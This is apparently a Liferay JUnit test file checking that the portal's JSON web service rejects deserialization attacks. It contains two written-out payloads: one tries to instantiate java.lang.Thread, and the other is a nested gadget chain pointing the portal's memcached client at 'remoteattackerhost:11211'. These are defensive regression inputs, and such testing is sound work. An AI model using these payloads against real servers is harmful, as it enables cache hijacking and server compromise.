/**
 * Copyright (c) 2000-2013 Liferay, Inc. All rights reserved.
 *
 * This library is free software; you can redistribute it and/or modify it under
 * the terms of the GNU Lesser General Public License as published by the Free
 * Software Foundation; either version 2.1 of the License, or (at your option)
 * any later version.
 *
 * This library is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public License for more
 * details.
 */

package com.liferay.portal.jsonwebservice;

import com.liferay.portal.kernel.jsonwebservice.JSONWebServiceAction;
import com.liferay.portal.kernel.util.StringBundler;

import junit.framework.TestCase;

import org.junit.BeforeClass;
import org.junit.Test;

import org.springframework.mock.web.MockHttpServletRequest;

/**
 * @author Igor Spasic
 */
public class JSONWebServiceSecureTest extends BaseJSONWebServiceTestCase {

	@BeforeClass
	public static void setUpClass() throws Exception {
		initPortalServices();

		registerActionClass(OpenService.class);
	}

	@Test
	public void testAttack1() throws Exception {
		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
			"/open/run1/foo-ids/[1,2,{\"class\":\"java.lang.Thread\"}]");

		JSONWebServiceAction jsonWebServiceAction = lookupJSONWebServiceAction(
			mockHttpServletRequest);

		try {
			jsonWebServiceAction.invoke();

			TestCase.fail();
		}
		catch (ClassCastException cce) {
		}
	}

	@Test
	public void testAttack2() throws Exception {
		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
			"/open/run2");

		StringBundler sb = new StringBundler(15);

		sb.append("{\"class\":");
		sb.append("\"com.liferay.portal.kernel.dao.orm.EntityCacheUtil\",");

		sb.append("\"entityCache\":{\"class\":");
		sb.append("\"com.liferay.portal.dao.orm.common.EntityCacheImpl\",");

		sb.append("\"multiVMPool\":{\"class\":");
		sb.append("\"com.liferay.portal.cache.MultiVMPoolImpl\",");

		sb.append("\"portalCacheManager\":{\"class\":");
		sb.append(
			"\"com.liferay.portal.cache.memcached.MemcachePortalCacheManager");
		sb.append("\",\"timeout\":60,\"timeoutTimeUnit\":\"SECONDS\",");

		sb.append("\"memcachedClientPool\":{\"class\":");
		sb.append("\"com.liferay.portal.cache.memcached.");
		sb.append("DefaultMemcachedClientFactory\",");

		sb.append("\"connectionFactory\":{\"class\":");
		sb.append("\"net.spy.memcached.BinaryConnectionFactory\"},");
		sb.append("\"addresses\":[\"remoteattackerhost:11211\"]}}}}}");

		mockHttpServletRequest.setParameter("bytes", sb.toString());

		JSONWebServiceAction jsonWebServiceAction = lookupJSONWebServiceAction(
			mockHttpServletRequest);

		try {
			jsonWebServiceAction.invoke();

			TestCase.fail();
		}
		catch (ClassCastException cce) {
		}
	}

}